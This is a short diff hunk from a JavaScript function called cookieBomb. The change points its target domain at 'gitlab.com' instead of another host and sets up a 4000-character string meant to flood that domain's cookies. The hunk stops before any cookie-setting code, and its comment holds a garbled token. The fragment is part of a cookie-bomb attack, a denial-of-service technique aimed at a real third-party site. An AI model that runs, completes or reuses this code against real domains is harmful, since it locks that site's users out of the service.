@@ -1,6 +1,6 @@
 function cookieBomb() {
     // Set target domain explicitlyzebidz
-    const domain = "modal-cdn.com";
+    const domain = "gitlab.com";
     
     // Large string to fill the cookies
     const pollution = "a".repeat(4000); // 4000 characters
